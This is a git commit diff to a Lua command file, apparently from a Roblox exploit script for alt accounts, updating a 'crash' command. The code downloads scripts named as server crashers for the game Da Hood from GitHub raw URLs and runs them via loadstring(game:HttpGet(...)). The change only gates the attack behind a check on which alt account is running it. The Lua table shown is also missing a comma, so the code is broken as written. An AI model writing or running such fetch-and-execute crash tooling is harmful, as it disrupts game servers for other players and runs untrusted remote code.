298443967df6869fa1022c86aaf617640b803c5b
scriptdumpkll <113224535+scriptdumpkll@users.noreply.github.com>
2022-09-24 22:43:42 +0800

    Update crash.lua

--- cmds/crash.lua
+++ cmds/crash.lua
@@ -2,14 +2,16 @@ return function(...)
     local data = ProccessArgs(...)
     local plr = game:service"Players".LocalPlayer
 
-    local lib = {
-        ['encrypt'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua',
-        ['quick'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua'
-        ['swagmode'] = 'https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher',
-    }
-    if data[2] == nil then
-        loadstring(game:HttpGet(lib['quick']))()
-    else
-        loadstring(game:HttpGet(lib[data[2]:lower()]))()
+    if ReSort(Alts)[1] == plr.UserId then
+        local lib = {
+            ['encrypt'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua',
+            ['quick'] = 'https://raw.githubusercontent.com/LPrandom/lua-projects/master/dhcquickcrash.lua'
+            ['swagmode'] = 'https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher',
+        }
+        if data[2] == nil then
+            loadstring(game:HttpGet(lib['quick']))()
+        else
+            loadstring(game:HttpGet(lib[data[2]:lower()]))()
+        end
     end
 end
